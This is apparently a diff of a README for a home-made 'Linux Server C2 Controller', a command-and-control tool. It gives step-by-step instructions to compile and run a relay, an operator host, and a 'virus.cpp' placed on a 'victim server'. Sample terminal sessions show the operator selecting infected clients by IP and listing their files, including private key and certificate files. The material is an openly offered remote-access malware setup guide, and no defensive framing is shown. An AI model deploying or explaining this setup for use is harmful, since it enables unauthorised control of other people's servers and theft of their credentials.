@@ -1,32 +1,58 @@
 Linux Server C2 Controller
-Different version of Linux may rely on different .so files to link, thus I don't put certain version of executable here, please compile these 3 code manually
 
-Step 1: Replace the ip address "192.168.80.132" in the tcsl.cpp and host.cpp
+Step 1:
+Replace the ip address "192.168.80.132" in the tcsl.cpp and host.cpp as your server ipv4 address
 
-
-Step 2: Copy all the codes, tcsl.cpp to your Linux Server, virus.cpp to your victim server, host.cpp to your local machine as control side, and then compile:
+Step 2:
+Copy tcsl.cpp to your Linux Server
+virus.cpp to your victim server
+host.cpp to your local machine as control side
+and then compile:
 
 g++ tcsl.cpp -o tcsl 
 g++ host.cpp -o host 
 g++ virus.cpp -o server 
 
-Step 3: Open 3 terminals and run the command seperately:
+Step 3: 
+Open 3 terminals and run the command seperately:
 ./tcsl
-And then you can run any amounts of Clients or Host with newly open up terminal
-the Host is config as the last connected, after the server has been opened, you can lauch the host or client first either way
+Support any amounts of Clients' connections
+the Host and Client is auto-recognized:  
 ./virus
 ./host
 
-Step 4: Enjoy your commands in the host terminal, it would reply the result send by you, for example:
+Step 4:
+Please use 'hs' followed with the client numbers you pick.
+For example: 'hs 1'
+Use 'hh' to check the connected clients.
 
-┌──(root㉿kali)-[/home/kali/Desktop]
-
-└─# ./host              
+Step 5:
+Enjoy your commands in the host terminal and control your client as terminal.
+For example:
 Connected to the server.
+No client connected.
+┌──(root♪hr0g) - [~]
+
+└─# ls
+Please use 'hs' followed with the client numbers you pick.
+
+For example: 'hs 1'
+
+Use 'hh' to check the connected clients.
+┌──(root♪hr0g) - [~]
+
+└─# hh
+
+Client 1:  Ip: 223.104.76.166
 
 ┌──(root♪hr0g) - [~]
 
+└─# hs 1
+Client 1 selected.
+┌──(root♪hr0g) - [~1]
+
 └─# ls 1
+
 ca.crt
 ca.key
 dh.pem
@@ -36,6 +62,68 @@ hr0g.crt
 hr0g.key
 server.conf
 
+┌──(root♪hr0g) - [~1]
+
+└─# exit
+
+Exited.
+Client 1:  Ip: 223.104.76.166
+
+┌──(root♪hr0g) - [~]
+
+└─# hs 1
+Client 1 selected.
+┌──(root♪hr0g) - [~1]
+
+└─# ls 1
+
+ca.crt
+ca.key
+dh.pem
+ha.crt
+ha.key
+hr0g.crt
+hr0g.key
+server.conf
+
+┌──(root♪hr0g) - [~1]
+
+└─# hs 2
+Client 2 selected.
+┌──(root♪hr0g) - [~2]
+
+└─# hh
+
+Client 1:  Ip: 223.104.76.166
+Client 2:  Ip: 223.104.76.166
+
+┌──(root♪hr0g) - [~2]
+
+└─# exit
+
+Exited.
+Client 1:  Ip: 223.104.76.166
+Client 2:  Ip: 223.104.76.166
+
+┌──(root♪hr0g) - [~]
+
+└─# hs 1
+Client 1 selected.
+┌──(root♪hr0g) - [~1]
+└─# exit
+
+Exited.
+Client 1:  Ip: 223.104.76.166
+Client 2:  Ip: 223.104.76.166
+
+┌──(root♪hr0g) - [~]
+
+└─# ls
+Please use 'hs' followed with the client numbers you pick.
+
+For example: 'hs 1'
+
+Use 'hh' to check the connected clients.
 ┌──(root♪hr0g) - [~]
 
 └─# 
